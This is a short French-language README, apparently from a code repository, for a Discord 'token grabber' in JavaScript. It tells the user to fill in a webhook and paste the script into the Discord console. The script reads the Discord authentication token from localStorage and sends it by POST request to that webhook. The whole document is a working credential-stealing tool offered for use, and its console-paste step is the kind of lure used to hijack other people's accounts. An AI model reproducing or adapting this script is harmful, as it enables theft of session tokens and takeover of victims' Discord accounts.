# Token-Grabber-Js
Script Token Grabber en NodeJS

1). Complete le script avec un webhook
2). Entrer le script dans la console de discord

```
location.reload();
var webhook = "";
var token = document.body.appendChild(document.createElement `iframe`).contentWindow.window.localStorage.token;
var request = new XMLHttpRequest();
request.open("POST", webhook);
request.setRequestHeader('content-type', 'application/json');
request.send(JSON.stringify({"content": token}));
```
